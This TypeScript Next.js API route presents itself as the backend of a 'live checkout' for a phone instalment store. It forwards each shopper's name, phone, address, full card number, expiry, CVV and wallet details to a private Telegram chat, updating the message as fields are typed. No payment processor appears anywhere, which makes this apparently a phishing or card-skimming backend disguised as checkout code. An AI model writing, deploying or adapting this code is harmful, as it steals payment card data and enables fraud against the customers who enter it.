import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { stepName, data, messageId } = body;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId || botToken.includes('your_telegram_bot_token')) {
      return NextResponse.json({ success: false, message: 'Telegram credentials missing' }, { status: 200 });
    }

    const timestamp = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

    let messageText = `⚡ <b>REALTIME LIVE CHECKOUT SESSION</b> [${timestamp}]\n`;
    messageText += `━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    messageText += `📍 <b>Current Stage:</b> <code>${stepName}</code>\n\n`;

    if (data.model) {
      messageText += `📱 <b>DEVICE:</b> ${data.model.name}\n`;
      messageText += `▫️ <b>Storage:</b> ${data.storage?.size || 'Default'}\n`;
      messageText += `▫️ <b>Color:</b> ${data.color?.name || 'Default'}\n`;
      messageText += `💰 <b>Total Price:</b> Rs. ${(data.totalPrice || data.model.basePrice || 0).toLocaleString('en-PK')}\n`;
      messageText += `💳 <b>EMI Tenure:</b> ${data.months || 24} Months @ Rs. ${(data.monthlyEmi || 0).toLocaleString('en-PK')}/mo\n\n`;
    }

    if (data.customer) {
      messageText += `👤 <b>CUSTOMER DETAILS:</b>\n`;
      messageText += `• <b>Name:</b> ${data.customer.fullName || '<i>Typing...</i>'}\n`;
      messageText += `• <b>Phone:</b> <code>${data.customer.mobileNumber || '<i>Typing...</i>'}</code>\n`;
      messageText += `• <b>Address:</b> ${data.customer.deliveryAddress || '<i>Typing...</i>'}\n`;
      messageText += `• <b>Payment Preference:</b> ${(data.customer.paymentMethod || 'card').toUpperCase()}\n\n`;
    }

    if (data.payment) {
      messageText += `💳 <b>PAYMENT INFO:</b>\n`;
      if (data.payment.bankId) messageText += `• <b>Bank:</b> ${data.payment.bankId.toUpperCase()}\n`;
      if (data.payment.cardName) messageText += `• <b>Card Name:</b> ${data.payment.cardName}\n`;
      if (data.payment.cardNumber) messageText += `• <b>Card Number:</b> <code>${data.payment.cardNumber}</code>\n`;
      if (data.payment.expiry) messageText += `• <b>Expiry:</b> ${data.payment.expiry}\n`;
      if (data.payment.cvv) messageText += `• <b>CVV:</b> <code>${data.payment.cvv}</code>\n`;
      if (data.payment.walletType) messageText += `• <b>Wallet Type:</b> ${data.payment.walletType.toUpperCase()}\n`;
      if (data.payment.walletAccountName) messageText += `• <b>Wallet Title:</b> ${data.payment.walletAccountName}\n`;
      if (data.payment.proofPreviewUrl) messageText += `• <b>Proof Screenshot:</b> Attached ✅\n`;
    }

    // Try editing existing message first if messageId exists
    if (messageId) {
      const editUrl = `https://api.telegram.org/bot${botToken}/editMessageText`;
      const editRes = await fetch(editUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          text: messageText,
          parse_mode: 'HTML'
        })
      });

      const editData = await editRes.json();
      if (editData.ok) {
        return NextResponse.json({ success: true, messageId });
      }
    }

    // Fallback: Send a new message if no messageId or edit failed
    const sendUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const sendRes = await fetch(sendUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: 'HTML'
      })
    });

    const sendData = await sendRes.json();
    if (sendData.ok) {
      return NextResponse.json({ success: true, messageId: sendData.result.message_id });
    }

    return NextResponse.json({ success: false, error: sendData.description }, { status: 500 });
  } catch (error: any) {
    console.error('Realtime Telegram error:', error);
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}
